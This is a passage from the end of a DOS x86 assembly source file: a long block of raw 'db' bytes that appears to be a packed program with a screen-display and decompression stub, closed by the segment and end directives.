                db      000h, 001h, 0ADh, 0ADh, 08Bh, 0E8h, 0B2h, 010h
                db      0E9h, 036h, 014h, 04Fh, 08Fh, 07Fh, 0FCh, 0B4h
                db      00Fh, 0CDh, 010h, 0B4h, 000h, 050h, 0FBh, 0B7h
                db      0B0h, 03Ch, 007h, 074h, 0FFh, 0FFh, 00Ah, 03Ch
                db      004h, 073h, 028h, 0B7h, 0B8h, 03Ch, 002h, 072h
                db      022h, 08Eh, 0C3h, 0BEh, 040h, 001h, 0FFh, 0FFh
                db      0B0h, 019h, 057h, 0B1h, 050h, 0F3h, 0A5h, 05Fh
                db      081h, 0C7h, 0A0h, 000h, 0FEh, 0C8h, 075h, 0F2h
                db      003h, 08Fh, 0B8h, 007h, 00Eh, 0D6h, 0FBh, 00Ch
                db      0CDh, 021h, 058h, 0F8h, 063h, 0A7h, 0CBh, 020h
                db      002h, 0FEh, 020h, 000h, 0FAh, 0EBh, 0B0h, 0FCh
                db      0F8h, 003h, 077h, 0F0h, 0E0h, 0D0h, 041h, 00Fh
                db      0C0h, 02Fh, 007h, 01Dh, 080h, 06Fh, 0BAh, 0DCh
                db      0E1h, 034h, 0DBh, 00Ch, 0F8h, 0F0h, 00Eh, 0DFh
                db      0FEh, 0F4h, 0F8h, 0BBh, 0AEh, 0F8h, 0E4h, 003h
                db      084h, 0E0h, 0FCh, 0EBh, 0B0h, 0E6h, 0EAh, 0A3h
                db      083h, 0DAh, 0AAh, 00Eh, 0DCh, 009h, 0BAh, 0C8h
                db      001h, 03Ah, 0F0h, 050h, 007h, 0A2h, 0E8h, 0E0h
                db      0ACh, 005h, 0DBh, 00Eh, 077h, 00Fh, 0F8h, 0DCh
                db      0F6h, 0BAh, 0AEh, 0F0h, 0F6h, 0EBh, 03Ah, 0F0h
                db      0F4h, 0E0h, 040h, 017h, 0FAh, 0ECh, 01Dh, 072h
                db      0DFh, 0DAh, 0D2h, 074h, 0F8h, 0BAh, 0DDh, 020h
                db      01Dh, 074h, 0DEh, 020h, 0AAh, 007h, 0BAh, 0D8h
                db      061h, 0F8h, 047h, 087h, 0F8h, 0E8h, 0E1h, 0E8h
                db      0F8h, 092h, 0F4h, 000h, 01Dh, 060h, 0D8h, 0E8h
                db      009h, 0DCh, 0FEh, 009h, 0F8h, 0B0h, 023h, 0F8h
                db      05Ch, 0D7h, 0FCh, 0F8h, 0FCh, 0E8h, 001h, 03Bh
                db      0F4h, 0ECh, 080h, 0D2h, 01Dh, 0BEh, 0BAh, 05Ch
                db      020h, 07Ch, 003h, 075h, 060h, 0CAh, 020h, 00Eh
                db      0B2h, 0D8h, 081h, 0F0h, 03Bh, 040h, 092h, 0D7h
                db      0B5h, 0CEh, 0F8h, 0DCh, 060h, 0A7h, 041h, 0DEh
                db      060h, 002h, 0B5h, 0BEh, 03Ch, 020h, 00Fh, 07Bh
                db      022h, 065h, 007h, 01Dh, 060h, 06Eh, 084h, 0CCh
                db      0DFh, 00Dh, 020h, 0C0h, 0B3h, 020h, 02Fh, 060h
                db      041h, 01Eh, 06Ah, 0DEh, 07Eh, 00Ah, 042h, 0E0h
                db      009h, 0E4h, 0C0h, 075h, 030h, 060h, 00Bh, 0DFh
                db      01Ch, 0F4h, 0E4h, 042h, 04Fh, 05Eh, 05Eh, 041h
                db      09Ah, 022h, 006h, 02Bh, 01Ch, 080h, 060h, 03Eh
                db      084h, 057h, 005h, 0CAh, 046h, 0A4h, 0D0h, 07Bh
                db      053h, 07Ah, 097h, 005h, 015h, 0C2h, 004h, 020h
                db      01Dh, 054h, 060h, 001h, 0C8h, 051h, 041h, 0E8h
                db      0DCh, 006h, 054h, 0BEh, 077h, 0D8h, 02Dh, 078h
                db      07Ah, 050h, 055h, 001h, 004h, 020h, 05Dh, 007h
                db      076h, 02Eh, 0AEh, 03Ah, 0C6h, 062h, 0E8h, 0A0h
                db      055h, 05Eh, 009h, 0A2h, 002h, 0C0h, 020h, 057h
                db      084h, 0C6h, 0D0h, 004h, 01Dh, 02Ah, 05Dh, 05Eh
                db      0D6h, 016h, 017h, 080h, 098h, 0A4h, 040h, 003h
                db      050h, 0EAh, 0ACh, 05Dh, 005h, 062h, 0C4h, 01Dh
                db      070h, 059h, 05Eh, 0C4h, 067h, 005h, 082h, 0DCh
                db      020h, 002h, 005h, 060h, 020h, 0E4h, 090h, 062h
                db      019h, 0D4h, 094h, 065h, 0ECh, 00Eh, 069h, 05Eh
                db      0CFh, 007h, 0A0h, 070h, 020h, 0B0h, 0A2h, 0B2h
                db      083h, 00Ah, 062h, 069h, 0CCh, 03Bh, 060h, 05Eh
                db      0D5h, 002h, 0BEh, 080h, 070h, 090h, 062h, 004h
                db      072h, 083h, 055h, 0FEh, 06Eh, 010h, 041h, 040h
                db      041h, 0AEh, 0FEh, 0CEh, 075h, 034h, 09Eh, 0FEh
                db      002h, 071h, 05Ch, 0BAh, 0AAh, 0E6h, 0CCh, 018h
                db      072h, 0C0h, 062h, 040h, 00Eh, 06Ch, 07Bh, 047h
                db      0F2h, 0BCh, 005h, 015h, 028h, 050h, 026h, 0E1h
                db      070h, 0FEh, 052h, 05Fh, 068h, 009h, 0FEh, 0BEh
                db      040h, 010h, 02Ah, 0F2h, 0AEh, 0E0h, 03Ah, 070h
                db      0FEh, 0FCh, 06Ah, 04Ah, 050h, 0DEh, 061h, 0ACh
                db      061h, 0C7h, 050h, 00Eh, 001h, 03Eh, 072h, 060h
                db      048h, 08Eh, 00Ah, 06Ah, 096h, 03Ah, 0E8h, 002h
                db      066h, 058h, 084h, 0B0h, 045h, 0B4h, 007h, 020h
                db      05Ah, 0EAh, 0E9h, 0C0h, 044h, 02Dh, 060h, 0E8h
                db      093h, 0A0h, 09Eh, 073h, 048h, 050h, 0C6h, 0FFh
                db      0F0h, 041h, 0D3h, 0FFh, 060h, 040h, 001h, 0FFh
                db      0D1h, 0EDh, 0FEh, 0CAh, 075h, 005h, 0ADh, 08Bh
                db      0E8h, 0B2h, 010h, 0C3h, 0E8h, 0F1h, 0FFh, 0D0h
                db      0D7h, 0E8h, 0ECh, 0FFh, 072h, 014h, 0B6h, 002h
                db      0B1h, 003h, 0E8h, 0E3h, 0FFh, 072h, 009h, 0E8h
                db      0DEh, 0FFh, 0D0h, 0D7h, 0D0h, 0E6h, 0E2h, 0F2h
                db      02Ah, 0FEh, 0B6h, 002h, 0B1h, 004h, 0FEh, 0C6h
                db      0E8h, 0CDh, 0FFh, 072h, 010h, 0E2h, 0F7h, 0E8h
                db      0C6h, 0FFh, 073h, 00Dh, 0FEh, 0C6h, 0E8h, 0BFh
                db      0FFh, 073h, 002h, 0FEh, 0C6h, 08Ah, 0CEh, 0EBh
                db      02Ah, 0E8h, 0B4h, 0FFh, 072h, 010h, 0B1h, 003h
                db      0B6h, 000h, 0E8h, 0ABh, 0FFh, 0D0h, 0D6h, 0E2h
                db      0F9h, 080h, 0C6h, 009h, 0EBh, 0E7h, 0ACh, 08Ah
                db      0C8h, 083h, 0C1h, 011h, 0EBh, 00Dh, 0B1h, 003h
                db      0E8h, 095h, 0FFh, 0D0h, 0D7h, 0E2h, 0F9h, 0FEh
                db      0CFh, 0B1h, 002h, 026h, 08Ah, 001h, 0AAh, 0E2h
                db      0FAh, 0E8h, 084h, 0FFh, 073h, 003h, 0A4h, 0EBh
                db      0F8h, 0E8h, 07Ch, 0FFh, 0ACh, 0B7h, 0FFh, 08Ah
                db      0D8h, 072h, 081h, 0E8h, 072h, 0FFh, 072h, 0D6h
                db      03Ah, 0FBh, 075h, 0DDh, 033h, 0EDh, 033h, 0FFh
                db      033h, 0F6h, 033h, 0D2h, 033h, 0DBh, 033h, 0C0h
                db      0E9h, 07Dh, 0EBh
                
last:

_TEXT           ends
                end    first


